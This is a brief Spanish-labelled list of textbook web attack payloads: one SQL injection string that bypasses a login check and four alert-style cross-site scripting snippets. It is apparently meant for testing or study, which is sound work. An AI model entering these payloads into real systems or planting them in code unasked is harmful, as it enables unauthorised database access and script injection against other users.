CODIGO MALICIOSO INYECCION SQL:
cualquiercosa' OR '1'='1

CODIGO MALICIOSO XSS:
<img src=x onerror=alert(1)>
<script>alert('XSS')</script>

<img src=x onerror=alert('Hacked')>
<div onclick="alert('click')">Haz clic aquí</div>
